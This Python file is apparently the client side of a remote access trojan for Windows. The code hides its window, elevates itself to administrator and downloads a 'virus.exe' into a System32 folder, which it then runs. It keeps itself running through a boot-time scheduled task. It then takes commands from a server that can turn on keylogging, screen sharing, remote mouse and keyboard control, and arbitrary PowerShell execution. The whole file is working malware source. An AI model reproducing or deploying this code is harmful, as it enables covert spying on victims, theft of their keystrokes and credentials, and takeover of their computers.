import win32gui
import win32con
import socket
import os
import time
import threading
import ctypes
import sys
import subprocess
from share_screens import ScreenSharingClient
from keylogger import KeyLogger
from remote_control import ClientRemoteControl


def fix_path(path):
    all_dirs = path.split("\\")
    fixed_path = "/".join(all_dirs)
    return fixed_path


IP = '127.0.0.1'
Port = 12345
save_path = os.path.join("C:\\Windows", 'System32', "1035")
file_path = os.path.join(save_path, 'virus.exe')
Current_Path = fix_path(os.getcwd())
PowerShell_Commands_File = 'C:/MyFolder/powershell_commands.txt'
PowerShell_Output_File = 'C:/MyFolder/powershell_output.txt'
keys = KeyLogger()
win32gui.ShowWindow(win32gui.GetForegroundWindow(), win32con.SW_HIDE)


def get_file_path(file_name):
    return Current_Path + "/" + file_name


def does_file_exist(path):
    if os.path.isfile(path):
        return True
    return False


def wait_for_file_change(path, timeout=None):
    initial_size = os.path.getsize(path)

    start_time = time.time()
    while os.path.getsize(path) == initial_size:
        time.sleep(1)

        if timeout is not None and time.time() - start_time > timeout:
            return False  # Timeout reached without file change

    return True  # File change detected


def write_command_to_file(path, message):
    formatted_message = f'{message}'
    try:
        file = open(path, 'w')
        file.write(formatted_message)
        print(f'message was successfully written to {path}')
        file.close()
    except Exception as e:
        print(f'Error writing message to {path}: {e}')


def copy_and_clear_file(path):
    try:
        # Read the contents of the file
        file = open(path, 'rb')
        file_data = file.read()
        file.close()

        # Clear the contents of the file
        file = open(path, 'w')
        file.write('')
        file.close()

        return file_data
    except Exception as e:
        return f"Error: {e}"


def receive_file(path, host, port):
    if os.path.exists(file_path):
        print(f"The file '{file_path}' already exists.")
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))
        s.send(b'stop')
        s.close()
        return
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))

        # Create the directory if it doesn't exist
        if not os.path.exists(path):
            os.makedirs(path)
        s.send(b'start')
        # Open a file for writing
        with open(os.path.join(path, 'virus.exe'), 'wb') as f:
            # Receive data in chunks and write to the file
            while True:
                chunk = s.recv(1024)
                if not chunk:
                    break
                f.write(chunk)
        # Close the connection and socket
        s.close()
        print(f"File received and saved as {os.path.join(save_path, 'virus.exe')}")
    except Exception as e:
        print(f"An error occurred: {e}")


def run_as_admin():
    # Get the script path and command line parameters
    script = os.path.abspath(__file__)
    params = ' '.join(sys.argv[1:])

    # Attempt to elevate privileges
    try:
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, script, params, 1)
    except Exception as e:
        print(f"Failed to elevate privileges: {e}")
        sys.exit(1)


def check_admin_rights():
    try:
        # Attempt to write to the System32 directory
        with open(os.path.join("C:\\Windows", 'System32', 'test.txt'), 'w') as f:
            f.write("Test")
        os.remove(os.path.join("C:\\Windows", 'System32', 'test.txt'))
        return True
    except PermissionError:
        return False


def create_folder_in_system32(folder_name):
    # Path to the System32 directory
    system32_path = 'C:/Windows/System32'

    # Path to the new folder
    new_folder_path = os.path.join(system32_path, folder_name)
    if os.path.exists(new_folder_path):
        print(f"Folder '{folder_name}' already exists in System32 directory.")
        return
    try:
        # Create the new folder
        os.makedirs(new_folder_path)
        print(f"Folder '{folder_name}' created in System32 directory.")
    except FileExistsError:
        print(f"Folder '{folder_name}' already exists in System32 directory.")
    except PermissionError:
        print("Permission denied: Unable to create folder in System32 directory.")
    except Exception as e:
        print(f"An error occurred: {e}")


def add_to_task_scheduler():
    script_path = os.path.abspath(__file__)
    task_name = "YouFoundMe"
    command = [
        'schtasks', '/create', '/f', '/sc', 'onstart',
        '/tn', task_name,
        '/tr', f'python "{script_path}"',
        '/rl', 'HIGHEST'
    ]
    try:
        subprocess.run(command, check=True)
        print(f"Task '{task_name}' created successfully.")
    except subprocess.CalledProcessError as e:
        print(f"Failed to create task: {e}")


def install_virus():
    # Check if the script is running with administrative privileges
    if not ctypes.windll.shell32.IsUserAnAdmin():
        print("This operation requires administrative privileges.")
        run_as_admin()
        sys.exit(0)
    # Check if the user is an administrator
    is_admin = check_admin_rights()
    if not is_admin:
        print("This operation requires administrative privileges.")
        sys.exit(0)
    # Create the folder in System32
    create_folder_in_system32("1035")
    receive_file(save_path, IP, 54321)
    try:
        subprocess.Popen(file_path)
        print(f"Executable '{file_path}' is running in the background")
    except Exception as e:
        print(f"An error occurred: {e}")
    finally:
        add_to_task_scheduler()
        print('success')


def main():
    install_virus()
    client_screen = ScreenSharingClient((IP, 9999))
    client_remote_control = ClientRemoteControl((IP, 9898))
    my_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    my_socket.connect((IP, Port))
    print("You connected successfully to the server!")
    while True:
        server_message = my_socket.recv(1024).decode()
        if not server_message:
            break
        print(server_message)
        if server_message.lower() == 'record' and not keys.is_logging:
            keys.start_logging()
            message = b'Recording keyboard input...'
        elif server_message.lower() == 'stop recording' and keys.is_logging:
            recorded_data = keys.stop_logging()
            my_socket.send(recorded_data.encode())
            message = b'Stop recording keyboard input...'
        elif server_message.lower() == 'share':
            share_screen_thread = threading.Thread(target=client_screen.start_sharing)
            share_screen_thread.start()
            message = b'Sharing screens...'
        elif server_message.lower() == 'stop sharing':
            client_screen.stop_sharing()
            message = b'Stop Sharing...'
        elif server_message.lower() == 'control':
            control_thread = threading.Thread(target=client_remote_control.start_controlling)
            control_thread.start()
            message = b'You can use both mouse and keyboard.'
        elif server_message.lower() == 'stop controlling':
            client_remote_control.stop_controlling()
            message = b'stop controlling mouse and keyboard.'
        else:
            write_command_to_file(PowerShell_Commands_File, server_message)
            if wait_for_file_change(PowerShell_Output_File, timeout=15):
                message = copy_and_clear_file(PowerShell_Output_File)
            else:
                message = b"The output file is empty"
        my_socket.send(message)
    my_socket.close()


if __name__ == "__main__":
    main()
